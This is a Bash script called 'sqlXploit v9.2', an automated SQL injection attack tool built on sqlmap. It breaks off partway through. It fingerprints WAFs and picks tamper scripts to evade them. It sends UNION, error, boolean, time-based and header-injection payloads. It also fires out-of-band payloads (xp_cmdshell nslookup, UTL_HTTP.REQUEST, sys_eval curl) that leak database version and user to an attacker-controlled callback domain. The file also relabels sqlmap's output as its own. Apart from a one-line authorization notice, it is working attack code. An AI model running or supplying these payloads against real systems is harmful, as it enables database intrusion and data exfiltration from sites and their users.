#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  sqlXploit v9.2 — UNION-FIRST | OOB | SMART ID | FULL DUMP
#  Order: UNION → ERROR → BOOLEAN → TIME → STACKED → OOB
#  sqlmap flags: --technique --level=3 --risk=2 --threads=4
#                --timeout=15 --retries=2 --time-sec=8
#                --batch --random-agent --smart
# ═══════════════════════════════════════════════════════════════════

set -uo pipefail

# ─────────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────────
R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'
B='\033[1;34m'; C='\033[1;36m'; M='\033[1;35m'
BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

# ─────────────────────────────────────────────
#  LOG FUNCTIONS
# ─────────────────────────────────────────────
LOG_FILE=""
log()    { echo -e "$*"; [[ -n "$LOG_FILE" && -f "$LOG_FILE" ]] && echo -e "$*" | sed 's/\x1b\[[0-9;]*m//g' >> "$LOG_FILE"; }
info()   { log "${B}[*]${NC} $*"; }
ok()     { log "${G}[✓]${NC} $*"; }
warn()   { log "${Y}[!]${NC} $*"; }
err()    { log "${R}[✗]${NC} $*"; }
intel()  { log "${C}[INTEL]${NC} $*"; }
auto()   { log "${M}[AUTO] ${NC} $*"; }
adapt()  { log "${Y}[ADAPT]${NC} $*"; }
hit()    { log "${R}${BOLD}[HIT!]${NC}  $*"; }
step()   { log "${G}[STEP] ${NC} $*"; }
spd()    { log "${M}[SPEED]${NC} $*"; }
sep()    { log "${M} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"; }
timer()  { log "${Y}[TIME] ${NC} $*"; }
oob()    { log "${R}${BOLD}[OOB]  ${NC} $*"; }
priv()   { log "${R}${BOLD}[PRIV] ${NC} $*"; }
ask()    { local r; read -rp "$(echo -e "${C}$1${NC} ")" r </dev/tty; echo "${r:-}"; }
iask()   { local r; printf "${C}%s${NC}" "$1" >&2; read -r r </dev/tty 2>/dev/null; echo "${r:-${2:-}}"; }
iask_yn(){
  local prompt="$1" default="${2:-y}"
  local a
  printf "${C}%s [y/n] (%s): ${NC}" "$prompt" "$default" >&2
  read -r a </dev/tty 2>/dev/null || a="$default"
  a="${a:-$default}"
  [[ "${a,,}" =~ ^y ]]
}

# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────
banner() {
  clear
  echo -e "${R}${BOLD}"
  cat << 'BANNER'
  ██████╗  ██████╗ ██╗     ██╗  ██╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
 ██╔════╝ ██╔═══██╗██║     ██║ ██╔╝██║  ██║██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
 ╚█████╗  ██║   ██║██║     █████╔╝ ███████║██████╔╝██║     ██║   ██║██║   ██║
  ╚═══██╗ ██║▄▄ ██║██║     ██╔═██╗ ██╔══██║██╔═══╝ ██║     ██║   ██║██║   ██║
 ██████╔╝ ╚██████╔╝███████╗██║  ██╗██║  ██║██║     ███████╗╚██████╔╝██║   ██║
 ╚═════╝   ╚══▀▀═╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
BANNER
  echo -e "${NC}"
  echo -e "${C}   ⚡ v9.2 — UNION-FIRST | OOB | SMART-ID | DBA-HUNTER ⚡${NC}"
  echo -e "${Y}           Developed by: TehanG07  |  www.cyberi.in${NC}"
  echo -e "${M} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

banner
echo -e "${R}[!] LEGAL:${NC} Authorized testing only. You are fully responsible.\n"

# ─────────────────────────────────────────────
#  DEPENDENCY CHECK
# ─────────────────────────────────────────────
sep
info "Checking dependencies..."
for dep in sqlmap curl python3 dig nslookup; do
  if ! command -v "$dep" >/dev/null 2>&1; then
    warn "Installing $dep..."
    sudo apt-get install -y "$dep" dnsutils >/dev/null 2>&1 || warn "Cannot install $dep — some features may be limited."
  fi
done
SQLMAP_VER=$(sqlmap --version 2>/dev/null | grep -oP '\d+\.\d+[\.\d]*' | head -1 || echo "unknown")
ok "sqlmap ${SQLMAP_VER} ready"
sep

# ─────────────────────────────────────────────
#  FILTERS
# ─────────────────────────────────────────────
STATIC_EXCL='\.(js|json|css|png|jpg|jpeg|gif|svg|ico|webp|avif|woff2?|ttf|otf|mp4|webm|mp3|wav|zip|rar|7z|tar|gz|bz2|br|map)(\?|$)'
AGGR_EXCL='\.(js|json|css|png|jpg|jpeg|gif|svg|ico|webp|avif|woff2?|ttf|otf|mp4|webm|mp3|wav|zip|rar|7z|tar|gz|bz2|br|map|html?|xml|txt|pdf)(\?|$)'

# ─────────────────────────────────────────────
#  INPUT MODE
# ─────────────────────────────────────────────
echo -e "${BOLD}[1] Input Mode${NC}"
echo -e "  ${G}1${NC}) Single URL"
echo -e "  ${G}2${NC}) URL list file"
echo -e "  ${G}3${NC}) Burp/ZAP request file"
mode=$(ask "Choose [1/2/3]:")
input_url=""; targets_file=""; burp_file=""
case "$mode" in
  1) input_url=$(ask "Target URL (with param e.g. ?id=1):")
     [[ -z "$input_url" ]] && { err "URL required."; exit 1; } ;;
  2) fp=$(ask "URL list file path:"); [[ -f "$fp" ]] || { err "File not found."; exit 1; }
     echo -e "  ${G}1${NC}) Conservative  ${G}2${NC}) Aggressive"
     fm=$(ask "Filter [1/2]:"); tmp="$(mktemp)"
     [[ "$fm" == "2" ]] && grep -Eiv "$AGGR_EXCL"   "$fp" | sed '/^\s*$/d' > "$tmp" \
                        || grep -Eiv "$STATIC_EXCL" "$fp" | sed '/^\s*$/d' > "$tmp"
     [[ -s "$tmp" ]] || { err "No targets after filter."; exit 1; }
     targets_file="$tmp"; ok "$(wc -l < "$tmp") targets queued." ;;
  3) burp_file=$(ask "Burp request file:"); [[ -f "$burp_file" ]] || { err "File not found."; exit 1; }
     ok "Request file loaded." ;;
  *) err "Invalid choice."; exit 1 ;;
esac

# ─────────────────────────────────────────────
#  FIXED SMART MODE — no menu
# ─────────────────────────────────────────────
MODE_NAME="SMART-v9.2"
SQLMAP_LEVEL=3
SQLMAP_RISK=2
SQLMAP_THREADS=4
TIME_SEC=8
DO_TIME_BASED=true
DO_OOB=true
SQLI_TIMEOUT=600
ok "Mode: ${MODE_NAME} | Level:${SQLMAP_LEVEL} | Risk:${SQLMAP_RISK} | Threads:${SQLMAP_THREADS}"

# ─────────────────────────────────────────────
#  SESSION / AUTH
# ─────────────────────────────────────────────
sep
echo -e "${BOLD}[2] Session / Auth${NC} ${DIM}(Enter to skip each)${NC}"
CK_VAL=""; COOKIE_OPT=""; HEADER_OPT=""; PROXY_OPT=""
CK_VAL=$(ask "Cookie (Enter to skip):")
[[ -n "$CK_VAL" ]] && COOKIE_OPT="--cookie=${CK_VAL}"
HD_VAL=$(ask "Custom header e.g. Authorization: Bearer xyz (Enter to skip):")
[[ -n "${HD_VAL:-}" ]] && HEADER_OPT="--headers=${HD_VAL}"
PX_VAL=$(ask "Proxy e.g. http://127.0.0.1:8080 (Enter to skip):")
[[ -n "${PX_VAL:-}" ]] && PROXY_OPT="--proxy=${PX_VAL}"

# OOB callback domain (optional — needed for DNS OOB)
echo ""
info "Out-of-Band (OOB) SQLi Setup ${DIM}(DNS/HTTP callback)${NC}"
OOB_DOMAIN=$(ask "OOB callback domain e.g. xyz.burpcollaborator.net (Enter to skip):")
OOB_HTTP_PORT=8888
OOB_ENABLED=false
[[ -n "${OOB_DOMAIN:-}" ]] && OOB_ENABLED=true && ok "OOB domain: ${OOB_DOMAIN}"

# ─────────────────────────────────────────────
#  OUTPUT DIR — tries CWD, then $HOME, then /tmp
# ─────────────────────────────────────────────
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
_DIRNAME="sqlxploit_${TIMESTAMP}"

# Pick a writable base directory
if   mkdir -p "${PWD}/${_DIRNAME}"   2>/dev/null; then BASE_DIR="${PWD}/${_DIRNAME}"
elif mkdir -p "${HOME}/${_DIRNAME}"  2>/dev/null; then BASE_DIR="${HOME}/${_DIRNAME}"
elif mkdir -p "/tmp/${_DIRNAME}"     2>/dev/null; then BASE_DIR="/tmp/${_DIRNAME}"
else
  echo -e "\033[1;31m[✗]\033[0m Cannot create output directory in CWD, HOME, or /tmp. Exiting."
  exit 1
fi

LOG_DIR="$BASE_DIR"
LOG_FILE="${LOG_DIR}/full_log.txt"
HITS_FILE="${LOG_DIR}/confirmed.txt"
INTEL_FILE="${LOG_DIR}/intel.txt"
BLOCK_LOG="${LOG_DIR}/blocks.txt"
DUMP_DIR="${LOG_DIR}/dumps"
OOB_LOG="${LOG_DIR}/oob_hits.txt"
UNION_LOG="${LOG_DIR}/union_probes.txt"
PRIV_LOG="${LOG_DIR}/privileges.txt"
mkdir -p "$DUMP_DIR"
: > "$LOG_FILE"; : > "$HITS_FILE"; : > "$INTEL_FILE"; : > "$BLOCK_LOG"
: > "$OOB_LOG";  : > "$UNION_LOG"; : > "$PRIV_LOG"
echo -e "\033[1;32m[✓]\033[0m Output directory: ${LOG_DIR}"

# ─────────────────────────────────────────────
#  TIMING
# ─────────────────────────────────────────────
SCAN_START=$(date +%s)
elapsed_since_start() { echo $(( $(date +%s) - SCAN_START )); }

# ─────────────────────────────────────────────
#  SANITIZER — hides sqlmap branding
# ─────────────────────────────────────────────
sanitize_output() {
  sed -e 's/sqlmap/sqlXploit/Ig' \
      -e '/^        ___/d' -e '/^       __H__/d' -e '/^ ___ ___/d' \
      -e '/^|___|/d' -e '/^|_ -|/d' -e '/^      |_|/d' -e '/sqlmap\.org/d'
}

# ─────────────────────────────────────────────
#  GLOBAL STATE
# ─────────────────────────────────────────────
BLOCK_COUNT=0
CURRENT_THREADS=$SQLMAP_THREADS
MAX_BLOCK_RETRIES=3
BASELINE_TIME=0
BASELINE_SIZE=0
WAF_NAME=""
DETECTED_TECHNIQUE=""
SQLI_FOUND=false
SQLI_TYPE=""            # tracks which type found: UNION/ERROR/BOOL/TIME/STACKED/OOB
CURRENT_TAMPER=""
CURRENT_DELAY=0
TAMPER_INDEX=0
UNION_COLS=0            # detected column count for UNION
UNION_REFLECT_COL=0     # which column reflects output

TAMPER_POOL=(
  "space2comment,between,randomcase"
  "space2comment,randomcase,charencode"
  "space2comment,charunicodeencode,between"
  "space2plus,randomcase,between,charencode"
  "space2comment,randomcase,equaltolike,between"
  "versionedkeywords,space2comment,randomcase"
  "modsecurityversioned,space2comment,randomcase"
  "space2comment,randomcase,charunicodeencode,versionedkeywords"
)

# ─────────────────────────────────────────────
#  CURL HELPERS
# ─────────────────────────────────────────────
do_curl() {
  local url="$1"; shift
  curl -s --max-time 15 -L \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122 Safari/537.36" \
    ${CK_VAL:+--cookie "${CK_VAL}"} \
    "$@" "$url" 2>/dev/null || echo ""
}

do_head() {
  curl -sI --max-time 8 -L -A "Mozilla/5.0" "$1" 2>/dev/null \
    | tr '[:upper:]' '[:lower:]' || echo ""
}

http_code() {
  curl -o /dev/null -s -w "%{http_code}" --max-time 6 "$1" 2>/dev/null || echo "000"
}

declare -A PCURL_PIDS
declare -A PCURL_FILES

pcurl_start() {
  local label="$1" url="$2"; shift 2
  local tmpf; tmpf=$(mktemp /tmp/pcurl.XXXXXX)
  PCURL_FILES["$label"]="$tmpf"
  ( do_curl "$url" "$@" > "$tmpf" 2>/dev/null ) &
  PCURL_PIDS["$label"]=$!
}

pcurl_wait() {
  local label="$1"
  local pid="${PCURL_PIDS[$label]:-}"
  [[ -n "$pid" ]] && wait "$pid" 2>/dev/null || true
  local f="${PCURL_FILES[$label]:-}"
  [[ -f "$f" ]] && cat "$f" && rm -f "$f" || echo ""
  unset "PCURL_PIDS[$label]" "PCURL_FILES[$label]"
}

pcurl_waitall() {
  for label in "${!PCURL_PIDS[@]}"; do
    local pid="${PCURL_PIDS[$label]}"
    wait "$pid" 2>/dev/null || true
    unset "PCURL_PIDS[$label]"
  done
}

# ─────────────────────────────────────────────
#  SMART ID MANIPULATION
#  Extracts numeric param values and tries negatives,
#  zero, huge numbers, and float tricks for UNION bypass
# ─────────────────────────────────────────────
get_smart_id_variants() {
  local url="$1"
  local -n _variants="$2"
  _variants=()

  # Extract all param=value pairs
  local query; query=$(echo "$url" | grep -oP '\?.*' | tr '?' ' ' | tr '&' '\n')
  while IFS= read -r pair; do
    local key val
    key=$(echo "$pair" | cut -d= -f1)
    val=$(echo "$pair" | cut -d= -f2-)
    # Only numeric values are interesting for UNION tricks
    if echo "$val" | grep -qP '^\d+$'; then
      local neg=$(( -1 * val ))
      _variants+=(
        "${url//${key}=${val}/${key}=${neg}}"          # id=-1
        "${url//${key}=${val}/${key}=0}"               # id=0
        "${url//${key}=${val}/${key}=999999}"           # id=999999
        "${url//${key}=${val}/${key}=-${val}}"         # id=-{val} explicit
        "${url//${key}=${val}/${key}=${val}.0}"        # id=1.0 float
        "${url//${key}=${val}/${key}=${val}--}"        # id=1--
        "${url//${key}=${val}/${key}=${val}%27}"       # id=1'
        "${url//${key}=${val}/${key}=${val}%22}"       # id=1"
      )
    fi
  done <<< "$query"
}

# ═══════════════════════════════════════════════════════════════
#  FAST BASELINE — 2 requests
# ═══════════════════════════════════════════════════════════════
capture_baseline() {
  local url="$1"
  info "Fast baseline (2 requests)..."
  local times=() sizes=()
  local i t_s t_e body el
  for i in 1 2; do
    t_s=$(date +%s%N)
    body=$(do_curl "$url")
    t_e=$(date +%s%N)
    el=$(( (t_e - t_s) / 1000000 ))
    times+=("$el")
    sizes+=(${#body})
    sleep 0.2
  done
  BASELINE_TIME=$(( (times[0] + times[1]) / 2 ))
  BASELINE_SIZE=$(( (sizes[0] + sizes[1]) / 2 ))
  intel "Baseline: ${BASELINE_TIME}ms | size: ${BASELINE_SIZE}B"
  echo "BASELINE: ${BASELINE_TIME}ms ${BASELINE_SIZE}B" >> "$INTEL_FILE"
}

# ═══════════════════════════════════════════════════════════════
#  WAF FINGERPRINT
# ═══════════════════════════════════════════════════════════════
fingerprint_target() {
  local url="$1"
  sep; info "WAF Fingerprinting..."
  local headers; headers=$(do_head "$url")
  WAF_NAME=""

  if   echo "$headers" | grep -q "cf-ray\|cloudflare";              then WAF_NAME="cloudflare"
  elif echo "$headers" | grep -q "x-akamai\|akamaighost";           then WAF_NAME="akamai"
  elif echo "$headers" | grep -q "x-amzn-requestid\|awselb";        then WAF_NAME="aws"
  elif echo "$headers" | grep -q "x-iinfo\|incap_ses\|visid_incap"; then WAF_NAME="imperva"
  elif echo "$headers" | grep -q "x-sucuri-id";                     then WAF_NAME="sucuri"
  elif echo "$headers" | grep -q "bigipserver\|f5-";                then WAF_NAME="f5"
  elif echo "$headers" | grep -q "barracuda";                       then WAF_NAME="barracuda"
  elif echo "$headers" | grep -q "x-fw-server\|fortiweb";           then WAF_NAME="fortiweb"
  elif echo "$headers" | grep -q "x-protected-by\|naxsi";           then WAF_NAME="naxsi"
  fi

  if [[ -z "$WAF_NAME" ]]; then
    local wsc; wsc=$(http_code "${url}%27%20OR%201%3D1--%20-")
    [[ "$wsc" =~ ^(403|406|418|501|999)$ ]] && WAF_NAME="generic"
  fi

  case "$WAF_NAME" in
    cloudflare)   CURRENT_TAMPER="space2comment,between,randomcase,charencode";               CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    akamai)       CURRENT_TAMPER="space2comment,randomcase,between,charunicodeencode";        CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    aws)          CURRENT_TAMPER="space2comment,randomcase,charunicodeencode,between";        CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    imperva)      CURRENT_TAMPER="space2comment,randomcase,charunicodeencode,multiplespaces"; CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    sucuri)       CURRENT_TAMPER="space2comment,randomcase,between,charencode";               CURRENT_DELAY=2; CURRENT_THREADS=1 ;;
    f5|barracuda|fortiweb) CURRENT_TAMPER="space2comment,between,randomcase,charencode";     CURRENT_DELAY=1; CURRENT_THREADS=2 ;;
    naxsi|generic) CURRENT_TAMPER="space2comment,between,randomcase";                        CURRENT_DELAY=1; CURRENT_THREADS=2 ;;
    "")           CURRENT_TAMPER=""; CURRENT_DELAY=0; CURRENT_THREADS=$SQLMAP_THREADS ;;
  esac

  sep
  log "${C}${BOLD}📊 TARGET INFO${NC}"
  log "  ${B}WAF     :${NC} ${WAF_NAME:-None}"
  log "  ${G}→ delay :${NC} ${CURRENT_DELAY}s | ${G}threads:${NC} ${CURRENT_THREADS} | ${G}tamper:${NC} ${CURRENT_TAMPER:-(none)}"
  sep
  echo "WAF=${WAF_NAME}" >> "$INTEL_FILE"
}

# ═══════════════════════════════════════════════════════════════
#  UNION-BASED COLUMN COUNT PROBE (manual pre-check)
#  Tries ORDER BY 1..20 and NULL-based UNION SELECT
#  Sets UNION_COLS and UNION_REFLECT_COL
# ═══════════════════════════════════════════════════════════════
probe_union_columns() {
  local url="$1"
  sep; info "UNION Pre-Probe: detecting column count via ORDER BY + NULL..."
  UNION_COLS=0
  UNION_REFLECT_COL=0

  local base_body; base_body=$(do_curl "$url")
  local base_len=${#base_body}

  # Step 1: ORDER BY binary-search style (1..20)
  local ob_max=0
  local i
  for i in 1 2 3 4 5 6 7 8 9 10 12 15 20; do
    local ob_enc
    ob_enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\" ORDER BY ${i}-- -\"))" 2>/dev/null || echo "%20ORDER%20BY%20${i}--%20-")
    local ob_body; ob_body=$(do_curl "${url}${ob_enc}" 2>/dev/null || echo "")
    local ob_len=${#ob_body}
    # If error or size drops dramatically — previous was valid
    if echo "$ob_body" | grep -qiE "unknown column|ORDER BY.*position|1054|ORA-01785|incorrect.*number"; then
      ob_max=$(( i - 1 ))
      intel "ORDER BY ceiling hit at col ${i} → max cols = ${ob_max}"
      break
    fi
    # Size-based: if response shrinks >30% it's likely an error page
    if (( base_len > 100 && ob_len < base_len * 70 / 100 )); then
      ob_max=$(( i - 1 ))
      intel "ORDER BY size drop at col ${i} → max cols = ${ob_max}"
      break
    fi
    ob_max=$i
  done

  (( ob_max < 1 )) && ob_max=10  # fallback: probe up to 10

  echo "UNION_ORDER_BY_MAX=${ob_max}" >> "$UNION_LOG"

  # Step 2: NULL-based UNION SELECT to find reflection column
  # Try id=-1 variants to suppress normal row output
  local neg_url="$url"
  local param_val
  param_val=$(echo "$url" | grep -oP '(?<=[?&])\w+=\K\d+' | head -1)
  if [[ -n "$param_val" ]]; then
    neg_url="${url/=${param_val}/=-${param_val}}"
  fi

  local c
  for c in $(seq 1 "$ob_max"); do
    # Build: UNION SELECT NULL,NULL,...,@@version,...,NULL
    local nulls=""
    local j
    for j in $(seq 1 "$ob_max"); do
      if (( j == c )); then
        nulls+="@@version"
      else
        nulls+="NULL"
      fi
      (( j < ob_max )) && nulls+=","
    done
    local union_payload
    union_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\" UNION SELECT ${nulls}-- -\"))" 2>/dev/null \
                   || echo "%20UNION%20SELECT%20${nulls//' '/%20}--%20-")
    local union_body; union_body=$(do_curl "${neg_url}${union_payload}" 2>/dev/null || echo "")
    if echo "$union_body" | grep -qiE "[0-9]+\.[0-9]+\.[0-9]+-|MariaDB|Microsoft SQL|PostgreSQL|Oracle|mysql"; then
      UNION_COLS=$ob_max
      UNION_REFLECT_COL=$c
      hit "UNION reflect column found: col ${c} of ${ob_max} (@@version leaked!)"
      echo "UNION_COLS=${UNION_COLS} UNION_REFLECT_COL=${UNION_REFLECT_COL}" >> "$UNION_LOG"
      echo "MANUAL_UNION_CONFIRMED: ${url} cols=${UNION_COLS} reflect=${UNION_REFLECT_COL}" >> "$HITS_FILE"
      return
    fi
  done

  # Step 3: String-based reflection (concat marker)
  local marker="sqlXploit_m4rk3r"
  for c in $(seq 1 "$ob_max"); do
    local nulls2=""
    for j in $(seq 1 "$ob_max"); do
      if (( j == c )); then
        nulls2+="'${marker}'"
      else
        nulls2+="NULL"
      fi
      (( j < ob_max )) && nulls2+=","
    done
    local up2
    up2=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\" UNION SELECT ${nulls2}-- -\"))" 2>/dev/null || echo "")
    [[ -z "$up2" ]] && continue
    local ub2; ub2=$(do_curl "${neg_url}${up2}" 2>/dev/null || echo "")
    if echo "$ub2" | grep -q "$marker"; then
      UNION_COLS=$ob_max
      UNION_REFLECT_COL=$c
      hit "UNION string reflection confirmed: col ${c} of ${ob_max}"
      echo "UNION_COLS=${UNION_COLS} UNION_REFLECT_COL=${UNION_REFLECT_COL}" >> "$UNION_LOG"
      echo "MANUAL_UNION_STRING_CONFIRMED: ${url} cols=${UNION_COLS} reflect=${UNION_REFLECT_COL}" >> "$HITS_FILE"
      return
    fi
  done

  warn "UNION manual probe: no direct reflection detected (sqlmap will still try)"
  echo "UNION_MANUAL=none" >> "$UNION_LOG"
}

# ═══════════════════════════════════════════════════════════════
#  ERROR-BASED QUICK PROBE
# ═══════════════════════════════════════════════════════════════
probe_error_based() {
  local url="$1"
  local payloads=(
    "'"
    "')"
    "'--"
    "\" OR 1=1--"
    "' OR '1'='1"
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -"
    "1 AND updatexml(1,concat(0x7e,version()),1)-- -"
    "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
  )
  intel "Error-based probe (${#payloads[@]} payloads)..."
  for pl in "${payloads[@]}"; do
    local enc; enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$pl" 2>/dev/null || echo "$pl")
    local body; body=$(do_curl "${url}${enc}" 2>/dev/null | head -c 4000)
    if echo "$body" | grep -qiE "you have an error in your sql|warning.*mysql_|pg_query\(\)|ora-[0-9]{4}|sqlite3?\..*error|mssql.*error|syntax error.*near|unexpected.*near|unterminated string|EXTRACTVALUE|XPATH.*error"; then
      intel "Error-based signal confirmed with: ${pl}"
      echo "ERROR_BASED_SIGNAL: ${url}" >> "$INTEL_FILE"
      return 0
    fi
  done
  return 1
}

# ═══════════════════════════════════════════════════════════════
#  BOOLEAN BLIND PROBE
# ═══════════════════════════════════════════════════════════════
probe_boolean() {
  local url="$1"
  intel "Boolean-blind probe..."
  pcurl_start "bt" "${url}%20AND%201%3D1--%20-"
  pcurl_start "bf" "${url}%20AND%201%3D2--%20-"
  local bt bf
  bt=$(pcurl_wait "bt"); bf=$(pcurl_wait "bf")
  local diff=$(( ${#bt} > ${#bf} ? ${#bt} - ${#bf} : ${#bf} - ${#bt} ))
  if (( diff > 80 )); then
    intel "Boolean diff ${diff}B confirmed"
    echo "BOOLEAN_SIGNAL: diff=${diff}" >> "$INTEL_FILE"
    return 0
  fi
  return 1
}

# ═══════════════════════════════════════════════════════════════
#  TIME-BASED PROBE
# ═══════════════════════════════════════════════════════════════
probe_time_based() {
  local url="$1"
  intel "Time-based probe..."
  local threshold=$(( BASELINE_TIME + 4500 ))
  local payloads=(
    "%27%20AND%20SLEEP(5)--%20-"
    "%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--%20-"
    "%27%7C%7Cpg_sleep(5)--%20-"
    "%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE('a',5)%20FROM%20DUAL--%20-"
  )
  for pl in "${payloads[@]}"; do
    local ts te el
    ts=$(date +%s%N)
    do_curl "${url}${pl}" > /dev/null 2>&1
    te=$(date +%s%N); el=$(( (te - ts) / 1000000 ))
    if (( el > threshold )); then
      intel "Time-based delay ${el}ms (payload: ${pl})"
      echo "TIME_BASED_SIGNAL: delay=${el}ms" >> "$INTEL_FILE"
      return 0
    fi
  done
  return 1
}

# ═══════════════════════════════════════════════════════════════
#  OUT-OF-BAND (OOB) PROBE
#  DNS exfiltration + HTTP callback
# ═══════════════════════════════════════════════════════════════
probe_oob() {
  local url="$1"
  [[ "$OOB_ENABLED" != "true" || -z "${OOB_DOMAIN:-}" ]] && return 1

  oob "OOB probe via DNS/HTTP to: ${OOB_DOMAIN}"
  local uid; uid=$(python3 -c "import random,string; print(''.join(random.choices(string.ascii_lowercase,k=6)))" 2>/dev/null || echo "oob001")
  local dns_target="${uid}.${OOB_DOMAIN}"

  # MySQL DNS OOB
  local mysql_oob_payloads=(
    "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.',user(),'.',${dns_target},'\\\\share\\\\x'))-- -"
    "1 AND (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT HEX(version())),0x2e,0x${dns_target//./},0x5c5c)))-- -"
    "1; EXEC master..xp_dirtree '\\\\${dns_target}\\share';-- -"
  )

  # HTTP OOB (MySQL INTO OUTFILE via curl-like trick in SELECT)
  local http_oob_payloads=(
    "' UNION SELECT 1,2,3 INTO OUTFILE '/dev/tcp/${OOB_DOMAIN}/${OOB_HTTP_PORT}'-- -"
    "1 AND (SELECT sys_eval('curl http://${dns_target}/oob?u='||user()))-- -"
  )

  # MSSQL OOB
  local mssql_oob_payloads=(
    "'; EXEC xp_cmdshell 'nslookup ${dns_target}';-- -"
    "'; EXEC master..xp_dirtree '\\\\${dns_target}\\x';-- -"
  )

  # Oracle OOB
  local oracle_oob_payloads=(
    "' UNION SELECT UTL_HTTP.REQUEST('http://${dns_target}/?v='||version) FROM v\$instance-- -"
    "' AND 1=utl_http.request('http://${dns_target}')-- -"
  )

  local all_oob=( "${mysql_oob_payloads[@]}" "${mssql_oob_payloads[@]}" "${oracle_oob_payloads[@]}" )

  # Fire all OOB payloads in background
  local i=0
  for pl in "${all_oob[@]}"; do
    local enc; enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$pl" 2>/dev/null || continue)
    pcurl_start "oob${i}" "${url}${enc}"
    ((i++)) || true
    (( i % 4 == 0 )) && pcurl_waitall
  done
  pcurl_waitall

  # DNS check — see if our subdomain resolved (requires dig)
  if command -v dig >/dev/null 2>&1; then
    local dns_check; dns_check=$(dig +short "${dns_target}" 2>/dev/null || echo "")
    if [[ -n "$dns_check" ]]; then
      oob "DNS OOB HIT! ${dns_target} → ${dns_check}"
      echo "OOB_DNS_HIT: ${url} → ${dns_target} (${dns_check})" >> "$OOB_LOG"
      echo "[OOB_CONFIRMED] ${url}" >> "$HITS_FILE"
      return 0
    fi
  fi

  # sqlmap OOB with --dns-domain if domain provided
  if [[ -n "${OOB_DOMAIN:-}" ]]; then
    oob "Running sqlmap with --dns-domain=${OOB_DOMAIN}..."
    local oob_cmd=( sqlmap -u "$url" --dns-domain="$OOB_DOMAIN"
                    --technique=U --level=3 --risk=2 --batch --random-agent
                    --timeout=20 --retries=1 --threads=1 )
    [[ -n "${COOKIE_OPT:-}" ]] && oob_cmd+=( "${COOKIE_OPT}" )
    [[ -n "${PROXY_OPT:-}"  ]] && oob_cmd+=( "${PROXY_OPT}"  )
    local oob_out
    oob_out=$(timeout 120 "${oob_cmd[@]}" </dev/null 2>&1 | sanitize_output) || true
    echo "$oob_out" >> "$OOB_LOG"
    if echo "$oob_out" | grep -qiE "dns.*(injectable|confirmed|vulnerable)"; then
      oob "sqlmap DNS OOB confirmed!"
      echo "[OOB_SQLMAP_CONFIRMED] ${url}" >> "$HITS_FILE"
      return 0
    fi
  fi

  return 1
}

# ═══════════════════════════════════════════════════════════════
#  HEADER INJECTION QUICK CHECK
# ═══════════════════════════════════════════════════════════════
test_header_injection_fast() {
  local url="$1"
  local payloads=(
    "User-Agent: Mozilla/5.0' AND '1'='1"
    "X-Forwarded-For: 1.1.1.1' AND SLEEP(1)-- -"
    "Referer: ${url}' AND '1'='1"
    "X-Real-IP: 1.1.1.1' AND '1'='1"
    "X-Forwarded-Host: evil.com' AND '1'='1"
    "X-Original-URL: /' AND '1'='1"
    "Accept-Language: en' AND SLEEP(1)-- -"
  )
  local i=0
  for h in "${payloads[@]}"; do
    pcurl_start "hdr${i}" "$url" -H "$h"; ((i++)) || true
  done
  local j=0
  for h in "${payloads[@]}"; do
    local body; body=$(pcurl_wait "hdr${j}")
    if echo "$body" | grep -qiE "you have an error in your sql|pg_query|ora-[0-9]|mssql"; then
      intel "Header injection hint: ${h%%:*}"
      echo "HEADER_INJECTABLE:${h%%:*}" >> "$INTEL_FILE"
    fi
    ((j++)) || true
  done
}

# ═══════════════════════════════════════════════════════════════
#  FULL PRESCAN — runs all probes in sequence
# ═══════════════════════════════════════════════════════════════
prescan_technique() {
  local url="$1"
  info "Pre-scan: detecting injectable techniques (UNION → ERROR → BOOL → TIME)..."
  DETECTED_TECHNIQUE=""
  local signals=()

  # 1. UNION probe (manual) — sets UNION_COLS / UNION_REFLECT_COL
  probe_union_columns "$url"
  (( UNION_COLS > 0 )) && signals+=("U") && intel "UNION confirmed manually (${UNION_COLS} cols)"

  # 2. Error-based
  probe_error_based "$url" && signals+=("E") && intel "ERROR-based signal confirmed"

  # 3. Boolean blind (parallel)
  probe_boolean "$url" && signals+=("B") && intel "BOOLEAN-blind signal confirmed"

  # 4. Time-based (only if nothing else found yet)
  if $DO_TIME_BASED && (( ${#signals[@]} == 0 )); then
    probe_time_based "$url" && signals+=("T") && intel "TIME-based signal confirmed"
  fi

  # Build technique string
  if (( ${#signals[@]} == 0 )); then
    DETECTED_TECHNIQUE="BE"
    warn "No signals — fallback to BE"
  else
    local raw_tech
    raw_tech=$(printf '%s' "${signals[@]}" | grep -o . | sort -u | tr -d '\n')
    DETECTED_TECHNIQUE="$raw_tech"
    # Always include BE as safety net unless only T detected
